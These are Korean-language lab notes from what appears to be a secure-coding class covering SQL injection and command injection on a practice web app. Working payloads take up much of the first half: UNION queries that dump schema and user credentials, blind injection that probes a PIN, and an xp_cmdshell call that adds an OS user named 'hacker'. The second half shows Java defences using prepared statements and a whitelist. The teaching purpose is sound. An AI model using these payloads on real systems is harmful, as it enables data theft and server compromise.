# 보안실습

### SQL Injection

* 입력 data가 SQL의 구조를 바꾸는 취약점



#### 1. Form Based





#### 2. Error Based

* 에러 미시지로 많은 정보를 취득할 수 있다 - 에러  코드, 상세 정보 등



 group by board_member.idx,board_member.username having 1=1--

-> 칼럼을 추가시켜 하나씩 확인해봄



and db_name()=1--

-> db_name이 1일 이유가 없음 -> 에러 메시지로 알아냄



#### 3. UNION SQL Injection

admin' and db_name()=1--



admin' union select version(),2,3,4,5,6 #



admin' union select schema_name,2,3,4,5,6 from information_schema.schemata#



admin' union select group_concat(table_name),2,3,4,5,6 from information_schema.tables where table_schema=database()#

-> 사용중인 데이터베이스의 컬럼 얻기(스키마)



admin' union select group_concat(column_name),2,3,4,5,6 from information_schema.columns where table_name='board_member'#

 -> 테이블 명을 알아낸 후 컬럼 얻기



admin' union select idx,userid,userpw,username,5,6 from board_member#

-> 테이블 데이터를 다 볼수있다(털림)



#### 4. stored procedure SQL injection

admin'; exec xp_cmdshell 'net user hacker hacker /add'--

서버 사용자 계정에 hacker가 추가됨

![16](https://user-images.githubusercontent.com/20276476/76811778-2070af80-6836-11ea-8b51-b0b72af66fe8.png)



#### 5. Blind SQL Injection

101 and 1=1 -> true

101 and 1=2 -> false

**이 결과를 보고 뒤에 물을 내용을 넣어서 네, 아니오 결과를 보고 정보를 알아냄**



101 and (select pin from pins where cc_number='1111222233334444')<3000

->true , pin이 3000보다 작다



blind SQL Injection은 시간이 많이 드므로 보통 자동화 툴을 사용한다.





http://xxx.xxx.xxx.xxx:xxxx/board_view.asp?num=1

-> 1번 게시물을 보겠다

-> 주소로 기능이 다 보인다 -> 보안에 취약하다



*****



#### 방어 기법은?

* SQL을 고정시키면 된다

* SQL을 DB에 내장시켜야 한다(내장 함수로)



1. `'or ''='`을 막아보자

   eclipse ->  Java Resources -> src -> kr.co.openeg.lab.test.com -> TestController.java열기

   찾기로 sql(347라인 정도)

   readDB -> ctrl 클릭하면 해당 함수로 간다

   ```java
   public String readDB(String id, String passwd) {
       StringBuffer  result=new StringBuffer();
       Connection con=null;
       Statement st=null;
       ResultSet rs=null;
       try {
           con = EConnection.getConnection(this);	
           st = con.createStatement();
   
           // 여기가 query
           // 이런식으로 (데이터가 쿼리랑 이어쓰기로 되어있는 구조) 되어있으면 injection 당함
   
           rs = st.executeQuery("select * from board_member where userid='"+id+"' and userpw='"+passwd+"'");
           rs = st.executeQuery("select * from board_member where userid='"+id+"' and userpw='"+passwd+"'");
           if ( rs.next() ) {
               result.append("ID: "+rs.getString(2));
               result.append("    PASSWORD: "+rs.getString(3));
           }
       } catch (SQLException e1) {
           // TODO Auto-generated catch block
           result.append("요청처리에러발생");
       }
   
       if ( rs != null ) try { rs.close(); }catch(SQLException e){}
       if ( st != null ) try { st.close(); }catch(SQLException e){}
       if ( con != null ) try { con.close(); }catch(SQLException e){}
   
       return result.toString();
   }
   ```



2. 다음과 같이 바꿔준다

   ```java
   public String readDB(String id, String passwd) {
       StringBuffer  result=new StringBuffer();
       Connection con=null;
       PreparedStatement st = null;
       // Statement st=null;
       ResultSet rs=null;
       try {
           con = EConnection.getConnection(this);	
           // st = con.createStatement();
           // ? -> 바인딩 포지션 : 데이터가 입력되는 위치
           st = con.prepareStatement("select * from board_menber where userid=? and userpw=?");
   
           // 1, 2번 포지션에 각각 id, pw를 바인딩 시켜줌
           st.setString(1, id);
           st.setString(2, passwd);
   
           rs = st.executeQuery();
           if ( rs.next() ) {		// 쿼리 결과가 있을 때
               result.append("ID: "+rs.getString(2));
               result.append("    PASSWORD: "+rs.getString(3));
           } else {					// 쿼리 결과가 없을 때
               result.append("no data");
           }
       } catch (SQLException e1) {
           // TODO Auto-generated catch block
           result.append("요청처리에러발생");
       }
   
       if ( rs != null ) try { rs.close(); }catch(SQLException e){}
       if ( st != null ) try { st.close(); }catch(SQLException e){}
       if ( con != null ) try { con.close(); }catch(SQLException e){}
   
       return result.toString();
   }
   ```

   * java.sql.Statement -> 일반택배
     * execute(SQL);
   * java.sql.PreparedStatement -> 전문택배 (위의 것을 상속) -> Parameterized API
     * execute(); <- 간판을 붙임
   * java.sql.CallableStatement -> 호출 택배(위의 것을 상속)
     * execute() <- 내장함수



* Node에도 Parameterized API 있음





#### 로그인 방어

eclipse ->  Java Resources -> src -> kr.co.openeg.lab.login

1. kr.co.openeg.lab.login.controller -> LoginController.java









*****



방어 코드 짤때 유의사항

1. 넘어가는 데이터의 값을 숨김

2. 다른 명령이 수행되지 않게 함

노드는 도스 공격에 가장 취약



#### command Injection

TestController.java -> command검색(174쯤)



뷰는 openeg -> WebContent -> WEB-INF -> test -> test.jsp

찾기 command

value를 0과 1로 바꿈

```jsp
작업선택:  <select  name="data"  id="data5">
         <option value="0">--- show File1.txt ---</option>
         <option value="1">--- show Dir ---</option>
      </select> <input type="button"   id="button5" value="실행"  > <br/>
       </pre>
     </form>
  </div> 

```





TestController.java고쳐줌 -> whitelist filter방어

```java
@RequestMapping(value="/test/command_test.do", method = RequestMethod.POST)
	@ResponseBody
	public String testCommandInjection(HttpServletRequest request, HttpSession session){
		StringBuffer buffer=new StringBuffer();	
		String data=request.getParameter("data");
			
		if(data != null){
			try{
				int dataNo = Integer.parseInt(data);
				switch(dataNo){
				case 0 :
					data = "type " +request.getSession().getServletContext().getRealPath("/")+"file1.txt"; 
					break;
					
				case 1:
					data = "dir ";
					break;
					
				default:
					// 변조되어서 들어오는 경우
					System.out.println("HACK-002:" + request.getRemoteAddr() + "의 해킹 시도 감지");	// 외부 시스템
					System.err.println("HACK-002:" + request.getRemoteAddr() + "의 해킹 시도 감지");	// 내부 시스템
					return buffer.append("10초 후 추적이 시작됩니다").toString();
				}
			} catch (NumberFormatException e){
				System.out.println("HACK-003:" + request.getRemoteAddr() + "의 해킹 시도 감지");	// 외부 시스템
				System.err.println("HACK-003:" + request.getRemoteAddr() + "의 해킹 시도 감지");	// 내부 시스템
				return buffer.append("10초 후 추적이 시작됩니다").toString();
			}
		} else {
			// 침해 대응
			// 원래는 모니터링 프로그램에 보내서 추적하게 해야하지만 
			// 없으므로 출력만 함
			System.out.println("HACK-001:" + request.getRemoteAddr() + "의 해킹 시도 감지");	// 외부 시스템
			System.err.println("HACK-001:" + request.getRemoteAddr() + "의 해킹 시도 감지");	// 내부 시스템
			return buffer.append("10초 후 추적이 시작됩니다").toString();
		}
		// 각 코드는 해킹 테이블에서 찾을 수 있다(설계 단계에서 작업 해놓아야 함)
    	
		Process process;
		String osName = System.getProperty("os.name");
		String[] cmd;

		if(osName.toLowerCase().startsWith("window")) {
		    cmd = new String[] { "cmd.exe","/c",data };
		    for( String s : cmd)
		       System.out.print(s+" ");
		} else {
		    cmd = new String[] { "/bin/sh",data };
		}

		try {
			process = Runtime.getRuntime().exec(cmd);
			InputStream in = process.getInputStream(); 
			Scanner s = new Scanner(in,"EUC-KR");
			buffer.append("실행결과: <br/>");
			while(s.hasNextLine() == true) {
			    buffer.append(s.nextLine()+"<br/>");
			}
		} catch (IOException e) {
			// TODO Auto-generated catch block
			buffer.append("실행오류발생");
			e.printStackTrace();
		} 
			return buffer.toString();

	}
```

